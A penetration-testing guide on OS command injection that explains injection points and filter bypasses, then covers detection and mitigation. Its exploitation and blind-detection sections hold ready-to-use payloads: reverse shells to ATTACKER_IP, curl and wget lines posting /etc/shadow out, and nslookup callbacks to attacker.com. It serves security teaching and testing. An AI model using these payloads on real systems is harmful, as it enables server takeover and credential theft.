% Filename: 04-web-testing/injection/command-injection.md
% Display name: Command Injection
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0002 (Execution)
% ATT&CK Techniques: T1059 (Command and Scripting Interpreter), T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# Command Injection

## Overview

Command injection (OS command injection) occurs when user input is passed to a system shell without proper sanitization. The attacker appends or injects shell commands that execute on the underlying operating system with the web application's privileges. This typically results in full server compromise — file read/write, reverse shells, lateral movement.

Unlike SQL injection which targets a database interpreter, command injection targets the OS shell directly (`sh`, `bash`, `cmd.exe`, `powershell`).

## ATT&CK Mapping

- **Tactic:** TA0002 - Execution
- **Technique:** T1059 - Command and Scripting Interpreter
- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Application passes user input to OS commands (e.g., `ping`, `nslookup`, `convert`, `ffmpeg`, file operations)
- Insufficient input sanitization before shell execution
- Common vulnerable patterns: system calls in PHP (`system()`, `exec()`, `passthru()`, `shell_exec()`, backticks), Python (`os.system()`, `subprocess.Popen(shell=True)`), Node.js (`child_process.exec()`), Java (`Runtime.getRuntime().exec()` with shell invocation, e.g., `exec(new String[]{"/bin/sh", "-c", input})`)

## Detection Methodology

### Identifying Injection Points

Command injection targets input that reaches shell functions. Look for features that suggest OS command execution:

- Network diagnostic tools (ping, traceroute, DNS lookup)
- File operations (upload, convert, compress, rename)
- PDF/image generation
- System status pages
- Backup/export functionality
- Any feature calling external binaries

### Boundary Testing

Inject shell metacharacters that chain or terminate commands:

```text
; id
| id
|| id
& id
&& id
$(id)
`id`
%0a id
\n id
```

**Linux operators:**
- `;` — command separator (runs regardless of previous command's success)
- `|` — pipe (feeds output of left command to right command, right command always executes)
- `||` — OR (runs right command only if left command fails)
- `&` — background (runs left command in background, then runs right command)
- `&&` — AND (runs right command only if left command succeeds)
- `$(cmd)` — command substitution (executes and substitutes output)
- `` `cmd` `` — command substitution (legacy syntax)
- `\n` (`%0a`) — newline (starts new command on some implementations)

**Windows operators:**
- `&` — runs both commands
- `&&` — runs second if first succeeds
- `|` — pipe
- `||` — runs second if first fails

## Techniques

### Basic Injection

When the application concatenates input directly into a command string:

```bash
# Application runs: ping -c 4 <user_input>
# Inject:
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
```

### Blind Command Injection

No output reflected in the response. Confirm execution through side channels.

**Time-based detection:**

```bash
# Linux
127.0.0.1; sleep 10
127.0.0.1 | sleep 10
127.0.0.1 && sleep 10

# Windows
127.0.0.1 & timeout /t 10
127.0.0.1 | ping -n 10 127.0.0.1
```

A 10-second delay in the HTTP response confirms execution.

**DNS-based detection (out-of-band):**

```bash
# Trigger DNS lookup to attacker-controlled domain
127.0.0.1; nslookup attacker.com
127.0.0.1; curl http://attacker.com/proof
127.0.0.1; wget http://attacker.com/$(whoami)

# Embed command output in DNS query
127.0.0.1; nslookup $(whoami).attacker.com
```

Use Burp Collaborator or a custom DNS server to catch callbacks.

**File-based detection:**

```bash
# Write to a web-accessible directory
127.0.0.1; id > /var/www/html/output.txt

# Then retrieve
curl http://target.com/output.txt
```

### Filter Bypass Techniques

**Space bypass (when spaces are filtered):**

```bash
# Linux - $IFS (Internal Field Separator, defaults to space)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd

# Tab character
;cat%09/etc/passwd

# Brace expansion
{cat,/etc/passwd}
```

**Keyword bypass (when specific commands are blocked):**

```bash
# Character insertion (quotes break keyword detection)
c'a't /etc/passwd
c"a"t /etc/passwd

# Backslash insertion
c\at /etc/passwd

# Variable expansion
/???/??t /etc/passwd          # Matches /bin/cat
/???/??n/w?o??i               # Matches /usr/bin/whoami

# Base64 encoding
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Hex encoding
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
```

**Operator bypass:**

```bash
# Newline injection (URL-encoded)
%0aid
%0a%0did          # CRLF

# Command substitution (when ; | & are blocked)
$(id)
`id`
```

**Windows-specific bypass:**

```cmd
:: Character insertion
w"h"oami
w^h^oami

:: Environment variable slicing
%COMSPEC:~-8,1%%COMSPEC:~-5,1%oami     &:: Uses characters from COMSPEC path
```

### Exploitation

Once injection is confirmed, escalate to interactive access:

```bash
# Reverse shell (Linux)
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Reverse shell (Windows)
127.0.0.1 & powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# File exfiltration
127.0.0.1; curl http://ATTACKER_IP:8000/ -d @/etc/shadow
127.0.0.1; wget --post-file=/etc/shadow http://ATTACKER_IP:8000/
```

## Automated Testing with commix

```bash
# commix
# https://github.com/commixproject/commix
# Basic GET parameter test
commix -u "http://target.com/page?ip=127.0.0.1" --batch

# POST data
commix -u "http://target.com/page" -d "ip=127.0.0.1" --batch

# From Burp saved request
commix -r request.txt --batch

# Specify technique: c=classic, e=eval, t=time-based, f=file-based
commix -u "http://target.com/page?ip=127.0.0.1" --technique=t --batch

# Execute a single command
commix -u "http://target.com/page?ip=127.0.0.1" --os-cmd="id" --batch

# Higher test level
commix -u "http://target.com/page?ip=127.0.0.1" --level=3 --batch

# File read
commix -u "http://target.com/page?ip=127.0.0.1" --file-read="/etc/passwd" --batch

# Shellshock module
commix -u "http://target.com/cgi-bin/script.sh" --shellshock --batch

# Use alternative shell (when default shell is restricted)
commix -u "http://target.com/page?ip=127.0.0.1" --alter-shell="Python" --batch
```

## Detection Methods

### Network-Based Detection

- HTTP parameters containing shell metacharacters (`;`, `|`, `&&`, `$(`, `` ` ``)
- URL-encoded newlines (`%0a`, `%0d%0a`) in parameter values
- Outbound connections from web servers to unexpected IPs (reverse shell indicators)
- DNS queries with encoded data in subdomains (exfiltration via DNS)

### Host-Based Detection

- Web server process spawning child shells (`sh`, `bash`, `cmd.exe`, `powershell`)
- Unexpected processes running under the web server user (`www-data`, `apache`, `IIS APPPOOL`)
- File writes to web-accessible directories from the web server process
- Bash history and audit logs showing commands not initiated by administrators

## Mitigation Strategies

- **Avoid shell calls entirely** — use language-native APIs instead of calling OS commands. For example, use Python's `socket` module instead of calling `ping`, or use `PIL`/`Pillow` instead of calling `convert`
- **If shell calls are unavoidable**, use parameterized execution (e.g., Python `subprocess.run(["ping", "-c", "4", user_input])` with `shell=False`) — arguments are passed as a list, not concatenated into a string
- **Input validation** — whitelist expected formats (IP addresses, filenames with strict regex). Reject all shell metacharacters
- **Least privilege** — web application should run as a low-privilege user with minimal filesystem access
- **Sandboxing** — containerize or chroot the web application to limit the impact of command execution

## References

### Official Documentation

- [commix GitHub Repository](https://github.com/commixproject/commix)

### Pentest Guides & Research

- [PortSwigger Web Security Academy - OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

### MITRE ATT&CK

- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
